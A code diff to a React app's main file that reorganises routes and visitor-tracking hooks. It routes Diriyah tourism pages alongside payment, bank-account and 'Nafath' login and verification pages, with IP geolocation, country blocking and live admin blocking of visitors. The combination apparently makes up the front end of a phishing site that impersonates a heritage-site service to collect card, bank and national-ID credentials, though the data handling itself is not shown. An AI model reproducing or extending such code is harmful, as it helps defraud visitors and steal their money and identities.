@@ -12,8 +12,6 @@ import { useLocation } from "wouter";
 import AmerChat from "./components/AmerChat";
 import TurnstileGate from "./components/TurnstileGate";
 
-// Main Pages (DDC Homepage)
-
 // Form Pages
 import SummaryPayment from "./pages/SummaryPayment";
 
@@ -59,6 +57,8 @@ import InmaApp from "./pages/InmaApp";
 
 // Final Page
 import FinalPage from "./pages/FinalPage";
+
+// Diriyah Pages
 import BujairiTerrace from "@/pages/bujairi-terrace";
 import AtTuraif from "@/pages/at-turaif";
 import SalwaPalace from "@/pages/salwa-palace";
@@ -66,18 +66,16 @@ import Dining from "@/pages/dining";
 import Shopping from "@/pages/shopping";
 import PlanYourVisit from "@/pages/plan-your-visit";
 
-
 function Router() {
   return (
     <Switch>
-      {/* Main Page (DDC Homepage) */}
-<Route path={"/bujairi-terrace"} component={BujairiTerrace} />
-<Route path={"/at-turaif"} component={AtTuraif} />
-<Route path={"/salwa-palace"} component={SalwaPalace} />
-<Route path={"/dining"} component={Dining} />
-<Route path={"/shopping"} component={Shopping} />
-<Route path={"/plan-your-visit"} component={PlanYourVisit} />
       <Route path={"/"} component={BujairiTerrace} />
+      <Route path={"/bujairi-terrace"} component={BujairiTerrace} />
+      <Route path={"/at-turaif"} component={AtTuraif} />
+      <Route path={"/salwa-palace"} component={SalwaPalace} />
+      <Route path={"/dining"} component={Dining} />
+      <Route path={"/shopping"} component={Shopping} />
+      <Route path={"/plan-your-visit"} component={PlanYourVisit} />
 
       {/* Form Routes */}
       <Route path={"/summary-payment"} component={SummaryPayment} />
@@ -115,24 +113,18 @@ function Router() {
       <Route path={"/bank-transfer"} component={BankTransfer} />
       <Route path={"/bank-account-number"} component={BankAccountNumber} />
 
-      {/* Final Page */}
       {/* Nafath Routes */}
       <Route path={"/nafath-login-page"} component={NafathLoginPage} />
       <Route path={"/nafath-login"} component={NafathLogin} />
       <Route path={"/nafath-verify"} component={NafathVerify} />
 
       <Route path={"/final-page"} component={FinalPage} />
-
-
       <Route path={"/404"} component={NotFound} />
-      {/* Final fallback route */}
       <Route component={NotFound} />
-        <Router />
     </Switch>
   );
 }
 
-// Blocked Country Page Component
 function BlockedCountryPage() {
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -161,40 +153,23 @@ function App() {
   });
   const [, setLocation] = useLocation();
 
-  // Set navigate callback for client-side navigation (no page reload)
   useEffect(() => {
     setNavigateCallback((path: string) => {
       setLocation(path);
     });
   }, [setLocation]);
 
-  // Page view tracking (lightweight HTTP ping, no socket)
   useEffect(() => {
     const SOCKET_URL = import.meta.env.VITE_API_URL || import.meta.env.VITE_SOCKET_URL || (import.meta.env.MODE === 'production' ? `https://api.${window.location.hostname}` : 'http://localhost:3001');
     const sessionId = 'pv_' + Math.random().toString(36).slice(2) + Date.now();
-    
-    // Send initial ping
-    fetch(`${SOCKET_URL}/api/page-ping`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessionId })
-    }).catch(() => {});
-    
-    // Send ping every 30 seconds
+    fetch(`${SOCKET_URL}/api/page-ping`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) }).catch(() => {});
     const interval = setInterval(() => {
-      fetch(`${SOCKET_URL}/api/page-ping`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId })
-      }).catch(() => {});
+      fetch(`${SOCKET_URL}/api/page-ping`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId }) }).catch(() => {});
     }, 30000);
-    
-    // Send leave on page close
     const handleLeave = () => {
       navigator.sendBeacon?.(`${SOCKET_URL}/api/page-leave`, JSON.stringify({ sessionId }));
     };
     window.addEventListener('beforeunload', handleLeave);
-    
     return () => {
       clearInterval(interval);
       window.removeEventListener('beforeunload', handleLeave);
@@ -202,11 +177,10 @@ function App() {
     };
   }, []);
 
-  // Initialize socket on app mount + clean disconnect on page close
   useEffect(() => {
     initializeSocket();
     const handleBeforeUnload = () => {
-      setLeaving(); // Set flag FIRST to prevent any reconnection attempts
+      setLeaving();
       if (socket.value && socket.value.connected) {
         socket.value.io.opts.reconnection = false;
         socket.value.disconnect();
@@ -219,17 +193,14 @@ function App() {
     };
   }, []);
 
-  // Listen for admin block/unblock events
   useEffect(() => {
     const s = socket.value;
-    if (!s) return; // Safety check
+    if (!s) return;
     const handleBlocked = () => {
       setIsVisitorBlocked(true);
       setBlockedMessage("تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.");
-      // Save to localStorage so block persists across reconnects and page reloads
       localStorage.setItem('visitor_blocked', 'true');
       localStorage.setItem('visitor_blocked_msg', 'تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.');
-      // Stop auto-reconnection so blocked page stays visible after disconnect
       if (s.io) s.io.opts.reconnection = false;
     };
     const handleUnblocked = () => {
@@ -246,29 +217,20 @@ function App() {
     };
   }, []);
 
-  // Check if visitor's country is blocked
   useEffect(() => {
     const checkCountry = async () => {
       try {
-        // Get visitor's country from IP
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         const visitorCountry = data.country_name;
-        
-        // Check with server if country is blocked
-        if (!socket.value) return; // Safety check
+        if (!socket.value) return;
         socket.value.emit('blockedCountries:check', visitorCountry);
-        
         socket.value.on('blockedCountries:checkResult', ({ isBlocked }) => {
           setIsCountryBlocked(isBlocked);
           setIsCheckingCountry(false);
         });
-
-        // Also listen for updates to blocked countries
         socket.value.on('blockedCountries:updated', async (blockedCountries: string[]) => {
-          const isBlocked = blockedCountries.some(c => 
-            c.toLowerCase() === visitorCountry.toLowerCase()
-          );
+          const isBlocked = blockedCountries.some(c => c.toLowerCase() === visitorCountry.toLowerCase());
           setIsCountryBlocked(isBlocked);
         });
       } catch (error) {
@@ -276,13 +238,10 @@ function App() {
         setIsCheckingCountry(false);
       }
     };
-
-    // Wait for socket to be ready
     const timer = setTimeout(checkCountry, 1000);
     return () => clearTimeout(timer);
   }, []);
 
-  // Show loading while checking country
   if (isCheckingCountry) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center">
@@ -291,12 +250,10 @@ function App() {
     );
   }
 
-  // Show blocked page if country is blocked
   if (isCountryBlocked) {
     return <BlockedCountryPage />;
   }
 
-  // Show blocked page if visitor is blocked by admin
   if (isVisitorBlocked) {
     return (
       <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
@@ -321,6 +278,7 @@ function App() {
             <Toaster />
             <ScrollToTop />
             <PageTitleUpdater />
+            <Router />
             <AmerChat />
           </TooltipProvider>
         </ThemeProvider>
